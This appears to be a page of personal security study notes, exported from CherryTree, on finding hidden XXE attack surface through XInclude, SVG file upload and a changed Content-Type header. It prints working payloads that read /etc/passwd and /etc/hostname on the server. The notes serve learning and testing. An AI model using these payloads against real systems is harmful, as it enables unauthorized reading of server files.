<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Find hidden attack surface</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Find hidden attack surface</h1><br/>• There are some places that don&#39;t contain any XML that you can attack<br /><strong><br />XInclude Attacks</strong><br />• Some apps recieve client-submitted data, embed it server side in XML doc, then parse it<br />   ◇ e.g. back-end SOAP request, processed by SOAP service<br />      ▪ Soap has built in error handling, response will contain error information<br />• Not normal attack, don&#39;t control the XML file.<br />• XInclude allows you to include XML from subdocuments<br />&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;<br />&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;<br />• Look for places taking input and put it there.<br /><strong><br />Via File Upload</strong><br />• When uploaded photo&#39;s are processed server-side<br />• Some use XML : like DOCX and SVG<br />• try and upload an SVG, because it uses XML, and attacker can submit malicious SVG image<br />&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;<br />&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;<br />&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;<br />	&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;<br />&lt;/svg&gt;<br /><strong><br />Via Modified Content Type</strong><br />• POST requests use default content types like “application/x-www-form-urlencoded”<br />• Some websites expect requests in this format, but will also tolerate other content types (like XML)<br />• Change Content-Type to text/xml and add some xml to the contents<br />&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;<br />• Easy to reach hidden XXE attack surfaces by reformating requests to use XML</div></body></html>